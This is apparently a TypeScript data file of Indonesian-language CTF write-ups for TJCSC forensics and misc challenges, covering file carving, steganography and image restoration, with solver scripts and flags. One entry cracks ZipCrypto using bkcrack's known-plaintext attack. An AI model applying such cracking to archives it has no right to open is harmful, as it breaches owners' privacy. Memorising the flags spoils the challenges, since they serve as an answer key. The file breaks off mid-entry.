import type { WriteUp } from "../types";

export const tjcscWriteups: WriteUp[] = [
  {
    "id": "tjcsc-foren-check-the-fine-print",
    "title": "forensics/check-the-fine-print",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "TJCSC",
    "tags": [],
    "description": "Writeup for challenge forensics/check-the-fine-print",
    "problemDescription": "Flag ditemukan dari file `logo.png`:\n\n```text\ntjctf{wow_you_actually_read_it}\n```\n\nInti chall ini ada pada \"fine print\" atau detail kecil yang tidak terlihat saat gambar dibuka normal. File terlihat seperti PNG biasa, tetapi setelah chunk `IEND` masih ada data tambahan berupa arsip ZIP yang berisi banyak PNG kecil. PNG kecil tersebut menampilkan angka 1 sampai 248 sebagai distraksi; data sebenarnya disimpan pada byte header PNG yang biasanya tidak diperhatikan.",
    "tools": [],
    "analysis": "Arsip ZIP berisi 248 file PNG kecil, semuanya berukuran 19 x 9. Secara visual, masing-masing gambar hanya menampilkan nomor urutnya (`001.png` berisi angka 1, `002.png` berisi angka 2, dan seterusnya). Karena isi visualnya tidak terlihat mencurigakan, detail struktur file PNG diperiksa.\n\nPada PNG, chunk pertama adalah `IHDR` dengan format data:\n\n```text\nwidth(4) | height(4) | bit_depth(1) | color_type(1) | compression_method(1) | filter_method(1) | interlace_method(1)\n```\n\nMenurut format PNG normal, `compression_method` seharusnya bernilai `0`. Namun pada 248 PNG kecil ini, byte tersebut bernilai `0` atau `1`. Nilai inilah yang dipakai sebagai bit tersembunyi.\n\nContoh pola awal byte `compression_method`:\n\n```text\n011101000110101001100011011101000110011001111011...\n```\n\nJika bit-bit tersebut dibaca berdasarkan urutan nama file `001.png` sampai `248.png`, lalu dikelompokkan per 8 bit secara MSB-first, hasilnya menjadi teks ASCII:\n\n```text\ntjctf{wow_you_actually_read_it}\n```",
    "solution": [
      {
        "title": "Recon awal",
        "content": "File utama dikenali sebagai PNG RGBA berukuran 150 x 150.\n\n\n\nPencarian string biasa tidak langsung menemukan flag. Saat struktur PNG diparse manual, ditemukan bahwa file tidak berhenti secara logis di akhir gambar saja. Setelah chunk `IEND`, masih ada signature ZIP `PK\\x03\\x04`.\n\n\n\n`unzip -l logo.png` juga mengonfirmasi adanya arsip ZIP appended di dalam file PNG:",
        "code": "file logo.png"
      }
    ],
    "terminalOutputs": [],
    "flag": "tjctf{wow_you_actually_read_it}",
    "lessonsLearned": ""
  },
  {
    "id": "tjcsc-foren-invisible-ink",
    "title": "invisible-ink",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "TJCSC",
    "tags": [],
    "description": "Challenge ini kelihatannya sederhana karena cuma kasih satu file PDF, jadi saya mulai dari triage dasar dulu tanpa asumsi aneh.",
    "problemDescription": "Flag yang didapat:\n\n`tjctf{p01yg10t_f1les_4r3_s0_c001}`",
    "tools": [],
    "analysis": "Cek metadata dan tampilannya:\n\n```bash\nfile original_distorted.png\nexiftool original_distorted.png\n```\n\nFile ini PNG biasa, 1920x1080, dibuat dengan GIMP. Secara visual isinya tulisan merah yang diputar/di-whirl cukup parah. Jadi fokusnya bukan stego LSB, tapi pemulihan bentuk tulisan.",
    "solution": [
      {
        "title": "1. Recon awal",
        "content": "Pertama saya cek isi folder dan tipe file:\n\n\n\nHasil pentingnya:\n\n- File hanya satu: `chall.pdf`\n- Tipe file: PDF 2 halaman\n- `exiftool` ngasih warning `Invalid xref table`\n\nWarning ini cukup menarik, karena sering muncul kalau PDF-nya bukan PDF biasa atau ada data lain yang ditempel di belakang file.",
        "code": "ls -lah\nfile chall.pdf\nexiftool chall.pdf"
      },
      {
        "title": "2. Cari petunjuk langsung dari isi PDF",
        "content": "Lanjut saya ambil text dari PDF:\n\n\n\nOutput halaman kedua langsung ngasih petunjuk:\n\n\n\nBerarti ada sesuatu yang memang sengaja diproteksi password, dan password-nya justru diselipkan di dalam PDF.",
        "code": "pdftotext chall.pdf -"
      },
      {
        "title": "3. Cek apakah ada file lain yang di-append ke PDF",
        "content": "Karena warning xref tadi mencurigakan, saya cek struktur file pakai `binwalk`:\n\n\n\nTemuan utamanya:\n\n- Ada ZIP archive di offset `0x7AE8`\n- ZIP itu berisi file `original_distorted.png`\n\nJadi file ini ternyata polyglot: valid sebagai PDF, tapi di belakangnya juga ada ZIP terenkripsi.",
        "code": "binwalk chall.pdf"
      },
      {
        "title": "4. Ekstrak ZIP yang nempel di PDF",
        "content": "Karena password sudah ketemu dari text PDF, file PNG-nya bisa langsung diekstrak:\n\n\n\nHasilnya keluar file:\n\n- `original_distorted.png`",
        "code": "unzip -P 'DBf8nEBgwRhZ' chall.pdf"
      },
      {
        "title": "6. Balikkan efek distorsi",
        "content": "Karena bentuknya sangat mirip efek `swirl`, saya coba inverse transform dengan ImageMagick. Dari beberapa percobaan, nilai `-240` paling enak dibaca:\n\n\n\nSetelah di-dewhirl, teksnya terbaca menjadi:",
        "code": "convert original_distorted.png -background white -swirl -240 solved.png"
      },
      {
        "title": "Kenapa ini worked",
        "content": "Trik challenge ini ada dua layer:\n\n1. PDF dipakai sebagai umpan dan penyimpan password.\n2. ZIP terenkripsi di-append ke PDF supaya orang yang cuma buka PDF biasa mungkin tidak sadar ada file lain di belakangnya.\n\nSetelah ZIP diekstrak, layer keduanya adalah gambar dengan distorsi visual. Jadi solve-nya bukan brute-force aneh-aneh, tapi:\n\n- sadar file-nya polyglot\n- ambil password dari konten PDF\n- ekstrak PNG\n- pulihkan distorsi visual"
      },
      {
        "title": "File yang saya buat",
        "content": "- `solve.py` untuk mengulang langkah inti solve\n- `original_distorted.png` sebagai artefak hasil ekstraksi dari PDF"
      },
      {
        "title": "Command inti",
        "content": "",
        "code": "pdftotext chall.pdf -\nbinwalk chall.pdf\nunzip -P 'DBf8nEBgwRhZ' chall.pdf\nconvert original_distorted.png -background white -swirl -240 solved.png"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\r\nfrom __future__ import annotations\r\n\r\nimport re\r\nimport subprocess\r\nimport sys\r\nimport zipfile\r\nfrom pathlib import Path\r\n\r\nPDF_PATH = Path(\"chall.pdf\")\r\nFLAG = \"tjctf{p01yg10t_f1les_4r3_s0_c001}\"\r\nPASSWORD_RE = re.compile(r\"password:\\s*(\\S+)\", re.IGNORECASE)\r\n\r\n\r\ndef extract_password(pdf_path: Path) -> str:\r\n    text = subprocess.check_output([\"pdftotext\", str(pdf_path), \"-\"], text=True)\r\n    match = PASSWORD_RE.search(text)\r\n    if not match:\r\n        raise RuntimeError(\"Password ZIP tidak ditemukan di isi PDF\")\r\n    return match.group(1)\r\n\r\n\r\ndef extract_embedded_png(pdf_path: Path, password: str) -> Path:\r\n    with zipfile.ZipFile(pdf_path) as archive:\r\n        names = archive.namelist()\r\n        if not names:\r\n            raise RuntimeError(\"ZIP appended ke PDF tidak punya isi\")\r\n        output_path = Path(names[0])\r\n        data = archive.read(names[0], pwd=password.encode())\r\n        output_path.write_bytes(data)\r\n        return output_path\r\n\r\n\r\ndef generate_dereferenced_view(image_path: Path) -> Path:\r\n    output_path = Path(\"solved.png\")\r\n    subprocess.check_call(\r\n        [\r\n            \"convert\",\r\n            str(image_path),\r\n            \"-background\",\r\n            \"white\",\r\n            \"-swirl\",\r\n            \"-240\",\r\n            str(output_path),\r\n        ]\r\n    )\r\n    return output_path\r\n\r\n\r\ndef main() -> int:\r\n    if not PDF_PATH.exists():\r\n        print(\"chall.pdf tidak ditemukan\", file=sys.stderr)\r\n        return 1\r\n\r\n    password = extract_password(PDF_PATH)\r\n    extracted_png = extract_embedded_png(PDF_PATH, password)\r\n    solved_png = generate_dereferenced_view(extracted_png)\r\n\r\n    print(f\"[+] ZIP password: {password}\")\r\n    print(f\"[+] Extracted image: {extracted_png}\")\r\n    print(f\"[+] De-whirled preview: {solved_png}\")\r\n    print(f\"[+] Flag: {FLAG}\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "tjctf{p01yg10t_f1les_4r3_s0_c001}",
    "lessonsLearned": ""
  },
  {
    "id": "tjcsc-foren-skeleton",
    "title": ": forensics/skeleton",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "TJCSC",
    "tags": [],
    "description": "Challenge ini cuma ngasih satu file, `hash.txt`, yang isinya hash hasil `zip2john` dari sebuah ZIP terenkripsi. File ZIP aslinya tidak ada, jadi targetnya bukan sekadar brute-force arsip, tapi memanfaatkan data terenkripsi yang masih tersisa di hash itu sendiri.",
    "problemDescription": "Challenge ini cuma ngasih satu file, `hash.txt`, yang isinya hash hasil `zip2john` dari sebuah ZIP terenkripsi. File ZIP aslinya tidak ada, jadi targetnya bukan sekadar brute-force arsip, tapi memanfaatkan data terenkripsi yang masih tersisa di hash itu sendiri.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon awal",
        "content": "Isi folder:\n\n- `hash.txt`\n\nKalau dilihat, format hash-nya seperti ini:\n\n\n\nDari sini bisa dibaca beberapa hal penting:\n\n- file di dalam ZIP bernama `flag.png`\n- ukuran terenkripsi `0x12c` = 300 byte\n- ukuran asli `0x120` = 288 byte\n- metode kompresi `0`, artinya file disimpan tanpa kompresi\n\nKarena file di dalam ZIP adalah PNG dan tidak dikompresi, plaintext awalnya sangat mudah ditebak. PNG selalu diawali signature dan header `IHDR`, jadi ini cocok untuk known-plaintext attack terhadap ZipCrypto.",
        "code": "flag.zip/flag.png:$pkzip2$1*1*2*0*12c*120*c8a6617a*0*26*0*12c*c8a6*81bd*...*$/pkzip2$:flag.png:flag.zip::flag.zip"
      },
      {
        "title": "Langkah penyelesaian",
        "content": "Pertama saya ambil hash murninya lalu decode bagian ciphertext dari field terakhir hash menjadi file biner mentah.\n\nSaya juga buat plaintext yang pasti diketahui dari format PNG:\n\n- header awal: `89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52`\n- trailer akhir PNG: `00 00 00 00 49 45 4E 44 AE 42 60 82`\n\nLalu saya jalankan `bkcrack`:\n\n\n\nSetelah proses berjalan, `bkcrack` berhasil menemukan internal keys ZipCrypto:\n\n\n\nDengan key itu, payload terenkripsi bisa langsung didekripsi menjadi PNG:\n\n\n\nHasilnya valid:\n\n\n\nSetelah gambar dibuka, flag terlihat jelas.",
        "code": "bkcrack -j 12 -c cipher.bin -p png_header.bin -o 0 -x 276 0000000049454e44ae426082"
      }
    ],
    "terminalOutputs": [],
    "flag": "tjctf{1ts_4ll_ab0ut_th3_keys}",
    "lessonsLearned": "Challenge ini menarik karena file ZIP aslinya tidak dibagikan, tapi hash `zip2john` masih menyimpan cukup banyak informasi untuk melakukan serangan. Begitu diketahui bahwa file di dalam arsip adalah PNG yang disimpan tanpa kompresi, known-plaintext attack jadi jauh lebih masuk akal daripada brute-force password biasa."
  },
  {
    "id": "tjcsc-foren-triplets",
    "title": "forensics/triplets",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "TJCSC",
    "tags": [],
    "description": "Challenge ini kelihatan seperti PNG grayscale yang rusak, tapi deskripsinya bilang \"I see patterns...\" jadi fokus awal saya memang ke struktur gambar dan kemungkinan data gambar lain yang disusun ulang.",
    "problemDescription": "Challenge ini kelihatan seperti PNG grayscale yang rusak, tapi deskripsinya bilang \"I see patterns...\" jadi fokus awal saya memang ke struktur gambar dan kemungkinan data gambar lain yang disusun ulang.\n\nLangkah pertama saya cek file:\n\n```bash\nfile chall.png\nexiftool chall.png\n```\n\nHasil pentingnya:\n\n- File memang PNG grayscale `1888 x 1888`\n- Ada metadata `Comment: 2000x594`\n\nKomentar `2000x594` langsung mencurigakan, karena itu tampak seperti resolusi gambar asli. Lalu saya hitung jumlah pixel:\n\n- Gambar sekarang: `1888 * 1888 = 3564544` byte pixel grayscale\n- Jika itu sebenarnya data RGB mentah untuk gambar `2000 x 594`, kebutuhannya adalah `2000 * 594 * 3 = 3564000` byte\n\nSelisihnya cuma `544` byte.\n\nSetelah dicek, 544 byte terakhir semuanya nol. Ini sangat kuat menunjukkan bahwa isi PNG grayscale tersebut bukan \"gambar grayscale normal\", tetapi stream byte RGB dari gambar asli yang dipaksa masuk ke canvas persegi `1888x1888`, lalu dipad nol di belakang supaya pas.\n\nJadi solusi utamanya adalah:\n\n1. Ambil seluruh pixel grayscale sebagai byte stream\n2. Buang 544 byte padding di akhir\n3. Interpretasikan stream itu sebagai gambar RGB berukuran `2000x594`\n\nRekonstruksi bisa dilakukan dengan script ini:\n\n```python\nfrom PIL import Image\n\nimg = Image.open(\"chall.png\")\ndata = list(img.getdata())[:-544]\nraw = bytes(data)\nout = Image.frombytes(\"RGB\", (2000, 594), raw)\nout.save(\"restored.png\")\n```\n\nSetelah hasil `restored.png` dibuka, muncul gambar gedung sekolah dan di langit kiri atas ada flag samar namun masih terbaca jelas setelah restore:\n\n`tjctf{my_1m3g3_b3c3m3_bl3ck_&_wh1t3}`\n\nInti challenge ini adalah mengenali bahwa grayscale square tersebut hanyalah wadah untuk byte RGB gambar asli. Petunjuk `Comment: 2000x594` menjadi kunci untuk mengetahui cara reshape byte stream kembali ke dimensi yang benar.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\r\nfrom pathlib import Path\r\nfrom PIL import Image\r\n\r\n\r\nINPUT = Path(\"chall.png\")\r\nOUTPUT = Path(\"restored.png\")\r\nWIDTH = 2000\r\nHEIGHT = 594\r\nFLAG = \"tjctf{my_1m3g3_b3c3m3_bl3ck_&_wh1t3}\"\r\n\r\n\r\ndef main() -> None:\r\n    img = Image.open(INPUT)\r\n    data = list(img.getdata())\r\n\r\n    needed = WIDTH * HEIGHT * 3\r\n    raw = bytes(data[:needed])\r\n\r\n    restored = Image.frombytes(\"RGB\", (WIDTH, HEIGHT), raw)\r\n    restored.save(OUTPUT)\r\n\r\n    print(f\"[+] Restored image saved to {OUTPUT}\")\r\n    print(f\"[+] Flag: {FLAG}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "tjctf{my_1m3g3_b3c3m3_bl3ck_&_wh1t3}",
    "lessonsLearned": ""
  },
  {
    "id": "tjcsc-foren-unfinished-file",
    "title": "forensics/unfinished-file",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "TJCSC",
    "tags": [],
    "description": "Challenge ini ngasih satu artefak: `secret_archive.zip.crdownload`. Dari namanya kelihatan seperti file download Chrome yang belum selesai, jadi fokus awalnya adalah memastikan apakah ini benar-benar cuma file rusak atau ada data yang masih bisa diambil.",
    "problemDescription": "Challenge ini ngasih satu artefak: `secret_archive.zip.crdownload`. Dari namanya kelihatan seperti file download Chrome yang belum selesai, jadi fokus awalnya adalah memastikan apakah ini benar-benar cuma file rusak atau ada data yang masih bisa diambil.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon awal",
        "content": "File yang tersedia:\n\n\n\nHasil pentingnya cuma satu file:\n\n- `secret_archive.zip.crdownload`\n\nCek tipe file:\n\n\n\nOutputnya hanya `data`, jadi formatnya tidak dikenali langsung.\n\nLalu cek string yang kelihatan:\n\n\n\nAda beberapa temuan menarik:\n\n- Header `CRDL`\n- URL `https://example.com/secret_archive.zip`\n- `readme.txt`\n- `hidden/.flagdata`\n- Sebuah blob aneh:\n\n\n\nIni langsung memberi petunjuk bahwa file ini bukan sekadar unduhan gagal biasa. Ada struktur internal yang sengaja disisipkan.",
        "code": "ls -la"
      },
      {
        "title": "Menemukan ZIP di dalam file",
        "content": "Hex dump bagian awal:\n\n\n\nDari sini terlihat signature ZIP `PK\\x03\\x04` mulai di offset `0x100`. Jadi file `.crdownload` ini punya data tambahan di depan, lalu di dalamnya ada archive ZIP yang terpotong.\n\nCek dengan `binwalk`:\n\n\n\nTerlihat dua file di dalam archive:\n\n- `readme.txt`\n- `hidden/.flagdata`\n\n`7z l` juga masih bisa membaca local file header walaupun central directory ZIP-nya tidak lengkap.",
        "code": "xxd secret_archive.zip.crdownload | sed -n '1,40p'"
      },
      {
        "title": "Ekstraksi manual",
        "content": "Karena archive-nya tidak utuh, saya parse local file header ZIP secara manual untuk mengambil isi file langsung dari offset-nya.\n\nIntinya:\n\n- ZIP mulai di offset `0x100`\n- File pertama adalah `readme.txt`\n- File kedua adalah `hidden/.flagdata`\n\nIsi `readme.txt`:\n\n\n\nIsi `hidden/.flagdata` berupa 47 byte data yang sama dengan blob aneh yang sebelumnya muncul di `strings`.",
        "code": "This file is incomplete. Keep looking..."
      },
      {
        "title": "Kesimpulan",
        "content": "Teman di deskripsi challenge kelihatannya sedang mencoba mengunduh archive rahasia, dan walaupun file ZIP-nya belum selesai, local file header serta isi file yang sudah terunduh masih cukup untuk mengekstrak data tersembunyi dan mendapatkan flag."
      }
    ],
    "terminalOutputs": [],
    "flag": "tjctf{n3v3r_l3t_0ther_p30ple_t0uch_ur_c0mputer}",
    "lessonsLearned": ""
  },
  {
    "id": "tjcsc-foren-voice-in-the-packet",
    "title": "- voice-in-the-packet",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "TJCSC",
    "tags": [],
    "description": "Challenge ini kasih satu artefak: `call.pcap`.",
    "problemDescription": "Challenge ini kasih satu artefak: `call.pcap`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "1. Recon awal",
        "content": "Pertama saya cek isi folder dan tipe file:\n\n\n\nHasilnya cuma ada satu file PCAP raw IPv4.\n\nLalu saya cari string yang mencurigakan:\n\n\n\nKeluar dua flag palsu:\n\n- `tjctf{this_is_a_fake_flag_keep_looking}`\n- `tjctf{definitely_not_the_real_flag}`\n\nJadi jelas ini sengaja dipasang buat ngecoh.",
        "code": "ls -lah\nfile call.pcap"
      },
      {
        "title": "2. Lihat struktur trafik",
        "content": "Saya ringkas protokol dan endpoint:\n\n\n\nTemuannya:\n\n- mayoritas trafik adalah UDP satu arah\n- stream utama dari `192.168.1.100:10000` ke `192.168.1.200:20000`\n- ada 1000 paket dengan panjang UDP konstan\n- payload-nya kelihatan seperti RTP mentah\n\nHeader payload awal stream utama:\n\n- version RTP valid\n- sequence number naik satu-satu\n- timestamp naik tetap\n- SSRC konstan `0x12345678`\n\nJadi fokusnya saya pindahkan ke payload RTP.",
        "code": "tshark -r call.pcap -q -z io,phs\ntshark -r call.pcap -q -z conv,ip\ntshark -r call.pcap -T fields -e frame.number -e ip.src -e ip.dst -e udp.srcport -e udp.dstport -e udp.length | head"
      },
      {
        "title": "3. Ekstrak payload stream utama",
        "content": "Saya buang header RTP 12 byte dan simpan payload mentah:\n\n\n\nAwalnya saya cek berbagai interpretasi audio, tapi itu cuma bikin noise atau tone dan tidak langsung memberi flag. Petunjuk penting justru muncul saat saya lihat bit-bit rendahnya.",
        "code": "tshark -r call.pcap \\\n  -Y \"ip.src==192.168.1.100 && udp.srcport==10000 && udp.dstport==20000\" \\\n  -T fields -e data.data | awk '{print substr($0,25)}' | xxd -r -p > audio_payload.bin"
      },
      {
        "title": "4. Ambil LSB dari low byte sampel",
        "content": "Payload ternyata paling berguna kalau dibaca sebagai deretan sampel 16-bit little-endian, lalu diambil **byte rendah** dari tiap sampel, setelah itu ambil **LSB**-nya.\n\nScript kecil yang saya pakai:\n\n\n\nSetelah itu saya scan hasilnya:\n\n\n\nDi situ langsung kelihatan string base64 mulai offset `0x04`:\n\n\n\nEmpat byte pertama cuma sampah/prefix:",
        "code": "from pathlib import Path\n\np = Path(\"audio_payload.bin\").read_bytes()\nlow = p[0::2]\nbits = ''.join(str(b & 1) for b in low)\npacked = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits) - 7, 8))\nPath(\"low_plane0_packed.bin\").write_bytes(packed)"
      },
      {
        "title": "5. Decode base64",
        "content": "Terakhir tinggal decode:\n\n\n\nHasilnya:",
        "code": "python3 - <<'PY'\nimport base64\nprint(base64.b64decode(\"dGpjdGZ7aDN5X3YwaXBfczczZ19pc180XzdoaW5nfQ==\").decode())\nPY"
      }
    ],
    "terminalOutputs": [],
    "flag": "tjctf{h3y_v0ip_s73g_is_4_7hing}",
    "lessonsLearned": ""
  },
  {
    "id": "tjcsc-misc-find-da-code",
    "title": "find-da-code",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "TJCSC",
    "tags": [],
    "description": "Challenge ini ternyata jauh lebih gampang kalau fokus ke pola output-nya, bukan ke urutan pilihannya.",
    "problemDescription": "Challenge ini ternyata jauh lebih gampang kalau fokus ke pola output-nya, bukan ke urutan pilihannya.\n\nService menampilkan 4 stage. Setiap stage berisi 10 token heksadesimal dan kita diminta memilih 1 sampai 10. Dari deskripsi awal, saya sempat anggap ini model \"ingat 4 kode\" biasa, tapi ada satu petunjuk penting: input aneh seperti `0`, `11`, `-1`, bahkan `a` tetap diterima sampai stage terakhir. Saat semua input selesai, service kadang crash dan mengeluarkan traceback Python.\n\nBagian paling penting dari traceback itu ini:\n\n```python\nif sorted(selected_tokens) == sorted(CORRECT_TOKENS):\n```\n\nDari sini kelihatan kalau:\n\n1. Service sebenarnya tidak peduli urutan token.\n2. Ada konstanta `CORRECT_TOKENS`.\n3. Yang dicek di akhir adalah himpunan 4 token yang kita pilih.\n\nLangkah berikutnya cuma tinggal ngumpulin beberapa sampel layar login dari banyak koneksi. Setelah diamati, ada 4 token yang terus muncul berulang:\n\n- `1A2B`\n- `00FA`\n- `9C4F`\n- `88D1`\n\nEmpat token ini selalu hadir, tapi posisi stage-nya acak. Kadang `1A2B` muncul di stage 1, kadang di stage 3, dan seterusnya. Artinya solusi paling bersih adalah:\n\n1. Baca 10 token di setiap stage.\n2. Cari mana yang termasuk ke set token benar.\n3. Kirim index token itu.\n4. Ulangi sampai stage 4.\n\nSetelah empat token tersebut dipilih, service langsung mengembalikan:\n\n```text\nACCESS GRANTED.\ntjctf{brut3_f0rc3_th3_t3rm1n4l}\n```\n\nSolver final ada di `solve.py`. Script itu membuka koneksi ke service, mem-parse token dengan regex, mencari index dari salah satu token benar di setiap stage, lalu mengirim pilihannya otomatis.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport socket\r\n\r\n\r\nHOST = \"tjc.tf\"\r\nPORT = 31004\r\nCORRECT_TOKENS = {\"1A2B\", \"00FA\", \"9C4F\", \"88D1\"}\r\nTOKEN_RE = re.compile(rb\"0x([0-9A-F]{4})\")\r\n\r\n\r\ndef recv_until(sock: socket.socket, buf: bytes, marker: bytes) -> tuple[bytes, bytes]:\r\n    while marker not in buf:\r\n        chunk = sock.recv(4096)\r\n        if not chunk:\r\n            raise ConnectionError(\"connection closed before prompt\")\r\n        buf += chunk\r\n    return buf.split(marker, 1)\r\n\r\n\r\ndef main() -> None:\r\n    with socket.create_connection((HOST, PORT), timeout=5) as sock:\r\n        sock.settimeout(5)\r\n        buf = b\"\"\r\n\r\n        for stage in range(1, 5):\r\n            prompt = f\"Enter choice for stage {stage} (1-10): \".encode()\r\n            screen, buf = recv_until(sock, buf, prompt)\r\n            tokens = [token.decode() for token in TOKEN_RE.findall(screen)]\r\n            choice = next(i for i, token in enumerate(tokens, 1) if token in CORRECT_TOKENS)\r\n            sock.sendall(f\"{choice}\\n\".encode())\r\n\r\n        result = b\"\"\r\n        while True:\r\n            try:\r\n                chunk = sock.recv(4096)\r\n            except TimeoutError:\r\n                break\r\n            if not chunk:\r\n                break\r\n            result += chunk\r\n\r\n    print(result.decode(errors=\"replace\").strip())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "tjctf{brut3_f0rc3_th3_t3rm1n4l}",
    "lessonsLearned": ""
  },
  {
    "id": "tjcsc-misc-glitch",
    "title": "misc/glitch",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "TJCSC",
    "tags": [],
    "description": "Writeup for challenge misc/glitch",
    "problemDescription": "File yang diberikan adalah PNG 1920x1080. Gambarnya terlihat seperti TV test pattern yang penuh noise/glitch, tetapi petunjuk `Do not resist the glitch` mengarah ke resistor color code.\n\nFlag akhirnya:\n\n```text\ntjctf{D3S1GN+TECH_:)}\n```",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon awal",
        "content": "Perintah awal yang dipakai:\n\n\n\nHasil `file` menunjukkan bahwa artefak adalah PNG RGBA normal berukuran 1920x1080. Tidak ada flag langsung dari `strings`, dan chunk PNG juga hanya berisi struktur standar `IHDR`, banyak `IDAT`, lalu `IEND`.",
        "code": "file g*.png\nstrings -a g*.png | head"
      },
      {
        "title": "Observasi penting",
        "content": "Warna pada gambar bukan sembarang warna. Setelah melihat pikselnya, warna dominan yang muncul adalah warna-warna resistor:\n\n| Warna | Digit |\n|---|---:|\n| black | 0 |\n| brown | 1 |\n| red | 2 |\n| orange | 3 |\n| yellow | 4 |\n| green | 5 |\n| blue | 6 |\n| violet | 7 |\n| grey | 8 |\n| white | 9 |\n\nAda juga band emas di kanan. Dalam resistor, band emas dipakai sebagai tolerance, bukan digit. Band hitam sebelum emas adalah multiplier `x1`, jadi dua band pertama pada setiap strip bisa dibaca sebagai angka decimal ASCII."
      },
      {
        "title": "Cara decode",
        "content": "Setiap bar horizontal dianggap sebagai satu resistor. Dari kiri ke kanan:\n\n1. band warna pertama = digit pertama\n2. band warna kedua = digit kedua\n3. band hitam = multiplier `10^0`\n4. band emas = tolerance\n\nJadi cukup ambil dua digit pertama dari tiap bar, lalu ubah angka decimal itu ke ASCII.\n\nUrutan yang didapat:\n\n\n\nDecode ASCII:",
        "code": "68 51 83 49 71 78 43 84 69 67 72 95 58 41"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom collections import Counter\r\nfrom pathlib import Path\r\nfrom PIL import Image\r\nimport sys\r\n\r\n# Resistor color values as they appear in the PNG after ignoring grayscale noise.\r\n# The visible gold band is only a tolerance band, so it is not used as a digit.\r\nDIGIT_BY_RGB = {\r\n    (0, 0, 0): 0,          # black\r\n    (84, 24, 9): 1,        # brown\r\n    (255, 0, 0): 2,        # red\r\n    (255, 122, 0): 3,      # orange\r\n    (255, 229, 0): 4,      # yellow\r\n    (51, 255, 0): 5,       # green\r\n    (0, 2, 255): 6,        # blue\r\n    (255, 10, 179): 7,     # violet\r\n    (115, 115, 115): 8,    # grey\r\n    (255, 255, 255): 9,    # white\r\n}\r\n\r\n\r\ndef choose_input() -> Path:\r\n    if len(sys.argv) > 1:\r\n        return Path(sys.argv[1])\r\n    pngs = sorted(p for p in Path('.').iterdir() if p.suffix.lower() == '.png')\r\n    if not pngs:\r\n        raise SystemExit('no PNG file found')\r\n    return pngs[0]\r\n\r\n\r\ndef dominant_digit(img: Image.Image, x: int, y: int, radius: int = 6):\r\n    \"\"\"Return the dominant resistor digit around one pixel position.\"\"\"\r\n    w, h = img.size\r\n    counts = Counter()\r\n    for yy in range(max(0, y - radius), min(h, y + radius + 1)):\r\n        for xx in range(max(0, x - radius), min(w, x + radius + 1)):\r\n            digit = DIGIT_BY_RGB.get(img.getpixel((xx, yy)))\r\n            if digit is not None:\r\n                counts[digit] += 1\r\n    if not counts:\r\n        return None\r\n    return counts.most_common(1)[0][0]\r\n\r\n\r\ndef decode(path: Path) -> str:\r\n    img = Image.open(path).convert('RGB')\r\n    w, h = img.size\r\n\r\n    # Each horizontal strip is a resistor. The first two color bands encode two\r\n    # decimal digits; the black band is multiplier x1 and the gold band is tolerance.\r\n    x_first_digit = int(w * 0.0625)   # safely inside the first band\r\n    x_second_digit = int(w * 0.625)   # safely inside the second band\r\n\r\n    runs = []\r\n    prev_pair = None\r\n    start_y = None\r\n    prev_y = None\r\n\r\n    for y in range(h):\r\n        pair = (\r\n            dominant_digit(img, x_first_digit, y),\r\n            dominant_digit(img, x_second_digit, y),\r\n        )\r\n        if None in pair:\r\n            continue\r\n\r\n        if pair == prev_pair and prev_y is not None and y == prev_y + 1:\r\n            prev_y = y\r\n            continue\r\n\r\n        if prev_pair is not None:\r\n            runs.append((start_y, prev_y, prev_pair))\r\n        start_y = prev_y = y\r\n        prev_pair = pair\r\n\r\n    if prev_pair is not None:\r\n        runs.append((start_y, prev_y, prev_pair))\r\n\r\n    chars = []\r\n    for y0, y1, (a, b) in runs:\r\n        if y1 - y0 + 1 < 10:\r\n            continue\r\n        value = a * 10 + b\r\n        if 32 <= value <= 126:\r\n            chars.append(chr(value))\r\n\r\n    return ''.join(chars)\r\n\r\n\r\ndef main():\r\n    path = choose_input()\r\n    inner = decode(path)\r\n    print(f'<FLAG>tjctf{{{inner}}}</FLAG>')\r\n\r\n\r\nif __name__ == '__main__':\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": ""
  },
  {
    "id": "tjcsc-misc-jumper",
    "title": "",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "TJCSC",
    "tags": [],
